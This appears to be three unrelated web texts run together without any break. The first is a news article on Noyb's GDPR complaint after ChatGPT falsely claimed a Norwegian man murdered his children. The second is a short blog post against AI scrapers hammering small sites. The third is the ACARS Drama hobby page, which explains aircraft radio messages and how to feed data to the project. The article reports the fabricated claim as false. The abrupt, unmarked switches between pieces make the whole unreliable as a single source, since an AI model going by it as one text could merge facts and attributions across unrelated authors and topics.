<p>Privacy rights advocacy group <a href="https://noyb.eu/en" target="_blank" rel="noreferrer noopener nofollow">Noyb</a> is supporting an individual in Norway who was horrified to find <a href="https://techcrunch.com/2025/02/12/chatgpt-everything-to-know-about-the-ai-chatbot/">ChatGPT</a> returning made-up information that claimed he’d been convicted for murdering two of his children and attempting to kill the third.</p>







<p>Earlier privacy complaints about ChatGPT generating incorrect personal data have involved issues such as an <a href="https://techcrunch.com/2024/04/28/chatgpt-gdpr-complaint-noyb/" target="_blank" rel="noreferrer noopener">incorrect birth date</a> or <a href="https://techcrunch.com/2023/08/30/chatgpt-maker-openai-accused-of-string-of-data-protection-breaches-in-gdpr-complaint-filed-by-privacy-researcher/" target="_blank" rel="noreferrer noopener">biographical details that are wrong</a>. One concern is that OpenAI does not offer a way for individuals to correct incorrect information the AI generates about them. Typically OpenAI has offered to block responses for such prompts. But under the European Union’s General Data Protection Regulation (GDPR), Europeans have a suite of data access rights that include a right to rectification of personal data.</p>

<p>Another component of this data protection law requires data controllers to make sure that the personal data they produce about individuals is accurate — and that’s a concern Noyb is flagging with its latest ChatGPT complaint.</p>

<p>“The GDPR is clear. Personal data has to be accurate,” said Joakim Söderberg, data protection lawyer at&nbsp;Noyb, in a statement. “If it’s not, users have the right to have it changed to reflect the truth. Showing ChatGPT users a tiny disclaimer that the chatbot can make mistakes clearly isn’t enough. You can’t just spread false information and in the end add a small disclaimer saying that everything you said may just not be true.”</p>

<p>Confirmed breaches of the GDPR can lead to penalties of up to 4% of global annual turnover. </p>

<p>Enforcement could also force changes to AI products. Notably, an early GDPR intervention by Italy’s data protection watchdog that saw ChatGPT access temporarily blocked in the country in <a href="https://techcrunch.com/2023/03/31/chatgpt-blocked-italy/" target="_blank" rel="noreferrer noopener">spring 2023</a> led OpenAI to make changes to the information it discloses to users, for example. The <a href="https://apnews.com/article/italy-privacy-authority-openai-chatgpt-fine-6760575ae7a29a1dd22cc666f49e605f" target="_blank" rel="noreferrer noopener nofollow">watchdog subsequently went on to fine OpenAI €15 million</a> for processing people’s data without a proper legal basis.</p>


<p>Since then, though, it’s fair to say that privacy watchdogs around Europe have adopted a more cautious approach to GenAI as they try to <a href="https://techcrunch.com/2024/12/18/eu-privacy-body-weighs-in-on-some-tricky-genai-lawfulness-questions/">figure out how best to apply the GDPR to these buzzy AI tools</a>. </p>

<p>Two years ago, Ireland’s Data Protection Commission (DPC) — which has a lead GDPR enforcement role on a previous Noyb ChatGPT complaint — <a href="https://www.reuters.com/technology/irish-data-regulator-warns-against-rushing-into-chatbot-bans-2023-04-20/" target="_blank" rel="noreferrer noopener nofollow">urged against rushing to ban</a> GenAI tools, for example. This suggests that regulators should instead take time to work out how the law applies.</p>

<p>And it’s notable that a privacy complaint against ChatGPT that’s been under investigation by Poland’s data protection watchdog since <a href="https://techcrunch.com/2023/09/21/poland-chatgpt-gdpr-complaint-probe/" target="_blank" rel="noreferrer noopener">September 2023</a> still hasn’t yielded a decision. </p>







<p>Noyb’s new ChatGPT complaint looks intended to shake privacy regulators awake when it comes to the dangers of hallucinating AIs.</p>



<p>The nonprofit shared the (below) screenshot with TechCrunch, which shows an interaction with ChatGPT in which the AI responds to a question asking “who is Arve Hjalmar Holmen?” — the name of the individual bringing the complaint — by producing a tragic fiction that falsely states he was convicted for child murder and sentenced to 21 years in prison for slaying two of his own sons.</p>

<figure><img loading="lazy" decoding="async" width="838" height="360" src="https://techcrunch.com/wp-content/uploads/2025/03/Image-1-2.jpg?w=680" alt="" srcset="https://techcrunch.com/wp-content/uploads/2025/03/Image-1-2.jpg 838w, https://techcrunch.com/wp-content/uploads/2025/03/Image-1-2.jpg?resize=150,64 150w, https://techcrunch.com/wp-content/uploads/2025/03/Image-1-2.jpg?resize=300,129 300w, https://techcrunch.com/wp-content/uploads/2025/03/Image-1-2.jpg?resize=768,330 768w, https://techcrunch.com/wp-content/uploads/2025/03/Image-1-2.jpg?resize=680,292 680w, https://techcrunch.com/wp-content/uploads/2025/03/Image-1-2.jpg?resize=430,185 430w, https://techcrunch.com/wp-content/uploads/2025/03/Image-1-2.jpg?resize=720,309 720w, https://techcrunch.com/wp-content/uploads/2025/03/Image-1-2.jpg?resize=800,344 800w, https://techcrunch.com/wp-content/uploads/2025/03/Image-1-2.jpg?resize=668,287 668w, https://techcrunch.com/wp-content/uploads/2025/03/Image-1-2.jpg?resize=708,304 708w" sizes="auto, (max-width: 838px) 100vw, 838px"></figure>

<p>While the defamatory claim that Hjalmar Holmen is a child murderer is entirely false, Noyb notes that ChatGPT’s response does include some truths, since the individual in question does have three children. The chatbot also got the genders of his children right. And his home town is correctly named. But that just it makes it all the more bizarre and unsettling that the AI hallucinated such gruesome falsehoods on top.</p>

<p>A spokesperson for Noyb said they were unable to determine why the chatbot produced such a specific yet false history for this individual. “We did research to make sure that this wasn’t just a mix-up with another person,” the spokesperson said, noting they’d looked into newspaper archives but hadn’t been able to find an explanation for why the AI fabricated child slaying.</p>

<p><a href="https://techcrunch.com/2025/03/02/the-techcrunch-ai-glossary/" target="_blank" rel="noreferrer noopener">Large language models</a> such as the one underlying ChatGPT essentially do next word prediction on a vast scale, so we could speculate that datasets used to train the tool contained lots of stories of filicide that influenced the word choices in response to a query about a named man.</p>

<p>Whatever the explanation, it’s clear that such outputs are entirely unacceptable. </p>

<p>Noyb’s contention is also that they are unlawful under EU data protection rules. And while OpenAI does display a tiny disclaimer at the bottom of the screen that says “ChatGPT can make mistakes. Check important info,” it says this cannot absolve the AI developer of its duty under GDPR not to produce egregious falsehoods about people in the first place.</p>

<p>OpenAI was contacted for a response to the complaint. Its PR firm in Europe, Headland Consultancy, emailed us the following statement, attributed to an OpenAI spokesperson: “We continue to research new ways to improve the accuracy of our models and reduce hallucinations. While we’re still reviewing this complaint, it relates to a version of ChatGPT which has since been enhanced with online search capabilities that improves accuracy.”</p>







<p>While this GDPR complaint pertains to one named individual, Noyb points to other instances of ChatGPT fabricating legally compromising information — such as the Australian major who said he was <a href="https://www.barrons.com/news/australian-mayor-threatens-to-sue-over-alleged-chatgpt-defamation-51aac0e7" target="_blank" rel="noreferrer noopener nofollow">implicated in a bribery and corruption scandal</a> or <a href="https://www.abc.net.au/news/2024-11-04/ai-artificial-intelligence-hallucinations-defamation-chatgpt/104518612" target="_blank" rel="noreferrer noopener nofollow">a German journalist who was falsely named as a child abuser</a> — saying it’s clear that this isn’t an isolated issue for the AI tool.</p>

<p>One important thing to note is that, following an update to the underlying AI model powering ChatGPT, Noyb says the chatbot stopped producing the dangerous falsehoods about Hjalmar Holmen — a change that it links to the tool now searching the internet for information about people when asked who they are (whereas previously, a blank in its dataset could, presumably, have encouraged it to hallucinate such a wildly wrong response).</p>

<p>In our own tests asking ChatGPT “who is Arve Hjalmar Holmen?” the ChatGPT initially responded with a slightly odd combo by displaying some photos of different people, apparently sourced from sites including Instagram, SoundCloud, and Discogs, alongside text that claimed it “couldn’t find any information” on an individual of that name (see our screenshot below). A second attempt turned up a response that identified Arve Hjalmar Holmen as “a Norwegian musician and songwriter” whose albums include “Honky Tonk Inferno.”</p>

<p>While ChatGPT-generated dangerous falsehoods about Hjalmar Holmen appear to have stopped, both Noyb and Hjalmar Holmen remain concerned that incorrect and defamatory information about him could have been retained within the AI model.</p>

<p>“Adding a disclaimer that you do not comply with the law does not make the law go away,” noted Kleanthi Sardeli, another data protection lawyer at&nbsp;Noyb, in a statement. “AI companies can also not just ‘hide’ false information from users while they internally still process false information.”</p>

<p>“AI companies should stop acting as if the GDPR does not apply to them, when it clearly does,” she added. “If hallucinations are not stopped, people can easily suffer reputational damage.”</p>

<p>Noyb has filed the complaint against OpenAI with the Norwegian data protection authority — and it’s hoping the watchdog will decide it is competent to investigate, since Noyb is targeting the complaint at OpenAI’s U.S. entity, arguing its Ireland office is not solely responsible for product decisions impacting Europeans.</p>

<p>However, an earlier Noyb-backed GDPR complaint against OpenAI, which was filed in Austria in <a href="https://techcrunch.com/2024/04/28/chatgpt-gdpr-complaint-noyb/" target="_blank" rel="noreferrer noopener">April 2024</a>, was referred by the regulator to Ireland’s DPC on account of <a href="https://techcrunch.com/2024/01/02/openai-dublin-data-controller/" target="_blank" rel="noreferrer noopener">a change made by OpenAI earlier that year</a> to name its Irish division as the provider of the ChatGPT service to regional users.</p>







<p>Where is that complaint now? Still sitting on a desk in Ireland.</p>

<p>“Having received the complaint from the Austrian Supervisory Authority in September 2024, the DPC commenced the formal handling of the complaint and it is still ongoing,” Risteard Byrne, assistant principal officer communications for the DPC told TechCrunch when asked for an update. </p>

<p>He did not offer any steer on when the DPC’s investigation of ChatGPT’s hallucinations is expected to conclude. </p>

<p>LLM and AI companies seem to all be in a race to
<a href="https://drewdevault.com/2025/03/17/2025-03-17-Stop-externalizing-your-costs-on-me.html">breathe the last breath of air</a> in every room
they stumble into. This practice started with larger
websites, ones that already had protection from
malicious usage like denial-of-service and abuse in the form
of services like Cloudflare or Fastly.</p>

<p>But the list of targets has been getting longer.
At this point we're seeing LLM and AI scrapers
<a href="https://thelibre.news/foss-infrastructure-is-under-attack-by-ai-companies/">targeting small project forges</a> like the <a href="https://gitlab.gnome.org/GNOME">GNOME GitLab server</a>.</p>

<p>How long until scrapers start hammering Mastodon servers? Individual websites?
Are we going to have to require authentication or JavaScript challenges on
every web page from here on out?</p>

<p>All this for what, shitty chat bots? What an awful thing that these companies are
doing to the web.</p>

<p>I suggest everyone that uses cloud infrastructure for hosting set-up
a billing limit to avoid an unexpected bill in case they're
caught in the cross-hairs of a negligent company.
All the abusers anonymize their usage at this point, so good luck trying to
get compensated for damages.</p>

        <p>Welcome to the home of <b>ACARS Drama</b>, the leading provider of aircraft based drama ingestion services.</p>
        
        <p>This small companion website is designed to provide a brief overview of the ACARS Drama project, along with some code snippets and other information regarding the project, and how you can contribute.</p>
        
        <p>The latest drama ingested is shown below:</p>

        <h2>A project to map out every broken coffee maker in the sky</h2>
        <!-- The existing content for the What tab starts here -->
        <p>A question I’ve been asked a few times since I took a little project I had for a year or so operating privately under my desk, and turned it into a social media bot.</p>
  
        <p>Note: this post is designed as a more high-level overview of what ACARS/VDLM2 messages are, and what my bot they feed is. So, if you’re looking for a more detailed technical overview of how the bot works, check out <a href="https://mike-sheward.medium.com/slack-messages-from-the-skies-9ea8ea9366f0">this earlier post from when it was first created as a Slack app</a>.</p>
  
        <p>When an aircraft is flying overhead, various radio signals are being transmitted and received by said aircraft constantly. Some examples of the radio signals, of course, are voice communications between pilots and air traffic controllers, that most people are familiar with. These are, of course, critical for safety, and ensuring planes are at the right altitude, going in the right direction, and at the right speed.</p>
  
        <p>In addition to voice, there are also a boat-load, well, plane-load I guess, of data signals. Amongst these data signals are the two types of signal that feed the bot’s insatiable thirst for drama. They are ACARS and VDLM2.</p>
  
        <p><strong>ACARS</strong>, which stands for Aircraft Communications Addressing and Reporting System, is a 1970’s era protocol that is still used today. A bunch of ground stations around the world are used to translate messages between computers in dispatch, maintenance and operations control rooms of the various airlines and their aircraft, and vice-versa, from the aircraft cockpit back to those airline computers.</p>
  
        <p><strong>VDLM2</strong>, which stands for VHF Data Link Mode 2, is similar in that it is a data transmission protocol that works over very high frequency (VHF) radio-waves, but it’s a bit more modern, uses different frequencies, is a bit faster, and can also carry ACARS messages.</p>
  
        <p>So, in summary, ACARS is where the drama usually is, sometimes transmitted in raw ACARS form, other times it is encapsulated in VDLM2. Same result all round really, you just have to look in a slightly different place to decode the ACARS inside of VDLM2 messages.</p>
  
        <p>Because I am a massive nerd when it comes to both radio stuff and planes (I was a PPL, almost did commercial but got rejected by the flight school I wanted to train at age 17 because I was ‘too quiet’, a problem I later rectified), I was able to buy a few relatively cheap bits of equipment that can listen for these signals from planes flying over my house, and using some open source software that other, much smarter people than me wrote, I was able to decode them. I then wrote some extra bits of software that fixes up the message (extracts only the human readable interesting bits, removes bad formatting etc), and turns it into the posts you see on ACARS Drama. That software also does the job of finding the aircraft photo and adding the tracking link too.</p>
  
        <p>Below is an image of an FMC from a cockpit:</p>
        <p><img src="https://acarsdrama.com/fmc.webp" alt="An FMC from a cockpit— source http://www.b737.org.uk/fmc.htm"></p><p>Now, because of how the system works, it is extremely hard to capture the ground to air signals, unless you live in close proximity to an airport or ground station, which I do not. So this means that pretty much 99% of what you see on ACARS Drama is air to ground. Essentially one side of a conversation, from the plane to folks on the ground. Sometimes it picks up ground to air, but it’s rare, and I honestly don’t know why it works when it does. If you do see a ground to air message, the bot will say “ACARS Message To” instead of “ACARS Message From”.</p>
  
        <p>Because of the sheer volume of the messages it picks up, around 2,000 an hour, most of which are just position and weather data, and automated readings from equipment, it would not be reasonable to post them all via the bot. That would just be annoying. So, I have carefully curated a list of keywords that the bot looks for in the messages received, to ensure that it only shares the ones with human-entered, “free-text” content. So when you see a message on the bot, it means that a pilot or crew member on the aircraft typed that into their ACARS terminal, which is usually a Flight Management Computer (FMC) device, like the one shown above.</p>
  
        <p>As a message is typed and sent via ACARS, if that plane is in range of one of my antennas (there are two currently being used for the ACARS drama bot), and on a frequency I’m monitoring (I currently monitor five total — 3 ACARS and 2 VDLM2), then it’ll be processed by my software and turned into the bot post that you see on Masto like this:</p>
  
        <p><img src="https://acarsdrama.com/example.webp" alt="Example image showing ACARS message details"></p><p>In this example, the message was captured in a VDLM2 frequency. The transmitting aircraft registration was N305SY, and its flight number was OO3682. OO is the code for Skywest Airlines, and N305SY is an Embraer 175 aircraft. The Track Aircraft link in the bot points to the registration, so you can see where in the sky the plane is at any given time, unless it’s on the ground of course.</p>
  
        <p>It’s fair to say that the overwhelming majority of messages transmitted are extremely routine and boring, contrary to the name of the bot — which to be honest, is part of the joke. So, you’ll mostly see things about asking for gate confirmations, reporting “snags” with the aircraft, usually toilet or coffee maker related, but occasionally you’ll see reports of drunk passengers, fights onboard — you know, air travel things. That’s what makes it an interesting and fun project. You also get to see the pilots’ personalities shine through as well, which I love. We all have good days and bad days at work, so you might see the occasional snarky message — but ultimately, these are professionals doing a wonderful job in not always the easiest of circumstances.</p>
  
        <p>So that’s what you’re seeing and how the bot works. You can follow along at <a href="https://infosec.exchange/@acarsdrama">https://infosec.exchange/@acarsdrama</a> if you aren’t already.</p>  </div>

        <h2>Harvest your sky drama!</h2>
        <p>If you would like to contribute to ACARS Drama, we'd love to have you! It's very easy to get started, all you need is a $30 SDR (like an RTL-SDR), an antenna, some open source software, and Internet access. This is how:</p>
        
        <h3>Quick Start</h3>
        <p>If you already have an instance of <b>acarsdec, dumpvdlm2, or acars_router</b> running, then all you need to do is include our ingestion endpoint in your configuration.</p>
        
        <p>Send <b>ACARS</b> messages to: <b>feedthe.acarsdrama.com:5550</b></p>
        <p>Send <b>VDLM2</b> messages to: <b>feedthe.acarsdrama.com:5555</b></p>
        <p>The connection can be either UDP or TCP (UDP is preferred), and should be in JSON format (the default for the three tools mentioned above).</p>
        <p>acars_router is required to be able to send acarsdec/dumpvdlm2 traffic to multiple servers, so if you are already feeding elsewhere directly from acarsdec or dumpvdlm2, you will need to introduce an acars_router instance in your pipeline to continue to feed both.</p>
        <p>If you do start feeding, be sure to DM @acarsdrama@infosec.exchange, and let us know where you are!</p>
        <h3>Need a bit more guidance?</h3>
        <p>For information about running your own acarsdec, dumpvdlm2 and acars_router containers, have a read through <a href="https://mike-sheward.medium.com/slack-messages-from-the-skies-9ea8ea9366f0">this earlier post</a>, but remember you only need to do the container bit.</p>
        
        <p>Check out our <a href="https://github.com/msheward287/acars-drama-feeder-configs/blob/main/docker-compose.yml" target="_blank">sample config on Github</a> for an example of how you can set up a minimal container setup to feed the drama engine.</p>
